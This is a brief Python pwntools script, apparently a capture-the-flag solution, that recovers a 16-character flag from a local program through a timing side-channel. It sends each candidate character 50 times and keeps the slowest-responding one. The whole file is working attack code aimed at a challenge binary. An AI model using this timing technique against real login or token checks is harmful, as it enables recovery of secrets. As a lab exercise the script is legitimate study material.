#!/usr/bin/python2.7

'''
  time-based side-channel attack
  (harder version, only 5ms)
'''

from __future__ import print_function
from pwn import *
import time

def now():
  return time.time()

p = process("side-channel.py")
dic = string.ascii_letters + "{}"

flag = ""

print("FLAG = " + p.recvline())

for i in range(16):
  mt = 0
  mc = 0
  
  for x in dic:
    t = 0
    for _ in range(50):
      p.sendline(flag+x)
      t -= now()
      p.recvline(5)
      t += now()
      
    print(flag+x, " = ", t)
    if t > mt:
      mt = t
      mc = x
	
  flag += mc
  print("FLAG = "+flag)
